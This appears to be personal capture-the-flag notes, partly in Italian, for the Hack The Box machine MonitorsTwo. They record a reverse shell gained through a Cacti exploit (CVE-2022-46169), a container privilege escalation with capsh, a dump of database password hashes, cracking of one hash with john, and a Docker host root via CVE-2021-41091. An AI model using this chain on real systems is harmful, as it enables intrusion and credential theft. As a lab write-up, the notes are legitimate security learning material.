@@ -1,0 +1,255 @@
+10.10.11.211
+
+
+port 80 
+
+software di 
+https://www.cacti.net/
+
+
+Version 1.2.22 | (c) 2004-2023 - The Cacti Group
+
+
+
+https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
+
+
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/monitorstwo]
+└─$ python3 cacti_exp.py -u http://10.10.11.211/ --LHOST=10.10.14.7 --LPORT=9001
+Checking...
+The target is vulnerable. Exploiting...
+Bruteforcing the host_id and local_data_ids
+Bruteforce Success!!
+
+
+
+┌──(kali㉿kali)-[~/…/ctfs-writeups/htb/done/monitorstwo]
+└─$ nc -lvnp 9001                                          
+listening on [any] 9001 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.11.211] 58884
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@50bca5e748b0:/var/www/html$ id     
+id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@50bca5e748b0:/var/www/html$ pwd
+pwd
+/var/www/html
+www-data@50bca5e748b0:/var/www/html$ 
+
+
+
+sono su docker 
+
+
+
+www-data@50bca5e748b0:/$ ls -lart
+ls -lart
+total 84
+drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
+drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
+drwxr-xr-x   1 root root 4096 Nov 15  2022 var
+drwxr-xr-x   1 root root 4096 Nov 15  2022 run
+-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
+drwxr-xr-x   1 root root 4096 Jan  9  2023 sbin
+-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
+drwxr-xr-x   1 root root 4096 Mar 21 10:49 etc
+drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
+drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
+drwx------   1 root root 4096 Mar 21 10:50 root
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 srv
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 opt
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 media
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 home
+drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
+drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
+dr-xr-xr-x 265 root root    0 Jul 30 22:40 proc
+dr-xr-xr-x  13 root root    0 Jul 30 22:40 sys
+drwxr-xr-x   5 root root  340 Jul 30 22:40 dev
+drwxrwxrwt   1 root root 4096 Jul 30 22:45 tmp
+
+
+
+
+
+
+cat entrypoint.sh                                                                                                                                                                                                 
+#!/bin/bash                                                                                                                                                                                                       
+set -ex                                                                                                                                                                                                           
+                                                                                                                                                                                                                  
+wait-for-it db:3306 -t 300 -- echo "database is connected"                                                                                                                                                        
+if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then                                                                                                    
+    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql                                                                                                                                   
+    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"                                                                                  
+    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"                                                                                                                           
+fi                                                                                                                                                                                                                
+                                                                                                                                                                                                                  
+chown www-data:www-data -R /var/www/html                                                                                                                                                                          
+# first arg is `-f` or `--some-option`                                                                                                                                                                            
+if [ "${1#-}" != "$1" ]; then                                                                                                                                                                                     
+        set -- apache2-foreground "$@"
+fi
+
+
+
+db----> root:root
+
+
+
+
+www-data@50bca5e748b0:/$ capsh --print
+capsh --print
+Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
+Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
+Ambient set =
+Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+ secure-no-ambient-raise: no (unlocked)
+uid=33(root) euid=0(root)
+gid=33(www-data)
+groups=33(www-data)
+Guessed mode: UNCERTAIN (0)
+
+
+intanto ho fatto privesc nel container, puo essere utile 
+
+
+www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/sbin/capsh
+/bin/mount
+/bin/umount
+/bin/su
+www-data@50bca5e748b0:/var/www/html$ sudo -l
+sudo -l
+bash: sudo: command not found
+www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
+capsh --gid=0 --uid=0 --
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+
+provo a vedere se trovo qualcosa nel db 
+
+mysql -u root -p -h db                      (hostname preso dal entrypoint.sh)
+
+
+
+www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db -e "show databases;"
+<ml$ mysql -u root -proot -h db -e "show databases;"
+Database
+information_schema
+cacti
+mysql
+performance_schema
+sys
+www-data@50bca5e748b0:/var/www/html$ 
+
+
+
+
+www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db -e "select * from user_auth;" cacti
+<ot -proot -h db -e "select * from user_auth;" cacti
+id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs     policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
+1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1on       -1      -1      -1              0       0       663348655
+3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       00
+4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1on       -1      -1              on      0       0       2135691668
+
+
+
+
+└─$ john hashes_cacti --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:17 0.04% (ETA: 2023-08-02 04:03) 0g/s 95.11p/s 95.11c/s 95.11C/s mongol..monkey69
+funkymonkey      (?)     
+1g 0:00:01:29 DONE (2023-07-31 01:27) 0.01114g/s 95.07p/s 95.07c/s 95.07C/s 474747..coucou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+marcus:funkymonkey
+
+
+provo ad accedere con ssh alla macchina 
+
+
+marcus@monitorstwo:~$ id 
+uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
+marcus@monitorstwo:~$ cat user.txt 
+4533544e8e428b84efb73fd6d9551c59
+marcus@monitorstwo:~$ 
+
+
+
+
+
+marcus@monitorstwo:~$ docker -v 
+Docker version 20.10.5+dfsg1, build 55c4c88
+marcus@monitorstwo:~$ 
+
+
+
+https://github.com/UncleJ4ck/CVE-2021-41091
+
+
+
+provo ad eseguirlo sulla macchina 
+
+
+
+marcus@monitorstwo:~$ ./dockerexp.sh 
+[!] Vulnerable to CVE-2021-41091
+[!] Now connect to your Docker container that is accessible and obtain root access !
+[>] After gaining root access execute this command (chmod u+s /bin/bash)
+
+Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no):
+
+
+
+mi dice di connettermi al docker a cui ho accesso e diventare root, prima ho gia trovato il modo di fare privesc quindi lo rifaccio e do il comando per abilitare suid su bash
+
+
+
+marcus@monitorstwo:~$ ./dockerexp.sh 
+[!] Vulnerable to CVE-2021-41091
+[!] Now connect to your Docker container that is accessible and obtain root access !
+[>] After gaining root access execute this command (chmod u+s /bin/bash)
+
+Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
+[!] Available Overlay2 Filesystems:
+/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+
+[!] Iterating over the available Overlay2 filesystems !
+[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'
+
+[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+[!] Rooted !
+[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'
+
+[!] Spawning Shell
+bash-5.1# exit
+marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
+bash-5.1# cat /root/root.txt 
+1f12ecd859510d55d621ead70690c2f5
+bash-5.1# 
+
+
+
